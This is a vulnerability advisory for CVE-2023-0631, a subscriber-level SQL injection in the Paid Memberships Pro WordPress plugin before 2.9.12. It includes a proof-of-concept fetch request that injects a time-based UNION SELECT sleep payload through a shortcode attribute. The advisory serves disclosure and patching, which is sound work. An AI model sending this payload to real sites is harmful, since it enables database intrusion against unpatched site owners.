full_description = '''WordPress Plugin Vulnerabilities Paid Memberships Pro < 2.9.12 - Subscriber+ SQL Injection Description The plugin does not prevent subscribers from rendering shortcodes that concatenate attributes directly into an SQL query. Proof of Concept While logged in as a subscriber, send the following request: (await fetch('/wp-admin/admin-ajax.php',{method:'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'},body:'action=parse-media-shortcode&shortcode=[membership delay="Y" levels="(-1)) UNION SELECT sleep(10)-- ,L"]'})).text() If successful, the request should hang for ~10 seconds, indicating we successfully injected something in the affected SQL query. Affects Plugins paid-memberships-pro Fixed in 2.9.12 References CVE CVE-2023-0631 Classification Type SQLI OWASP top 10 A1: Injection CWE CWE-89 CVSS 7.7 (high) Miscellaneous Original Researcher Marc Montpas Submitter Marc Montpas Submitter website https://wpscan.com Submitter twitter marcS0H Verified Yes WPVDB ID 19ef92fd-b493-4488-91f0-e6ba51362f79 Timeline Publicly Published 2023-02-27 (about 1 year ago) Added 2023-02-27 (about 1 year ago) Last Updated 2023-02-27 (about 1 year ago) Other Published Title Published 2024-05-23 Title Web Directory Free < 1.7.0 - Unauthenticated SQL Injection Published 2021-12-15 Title Post Grid < 2.1.13 - Contributor+ SQL Injection Published 2024-06-11 Title Dokan Pro < 3.11.0 - Unauthenticated SQL Injection Published 2023-06-21 Title WooCommerce Product Vendors < 2.1.77 - Vendor Admin+ SQLi Published 2017-06-30 Title WP Statistics <= 12.0.7 - Authenticated SQL Injection'''
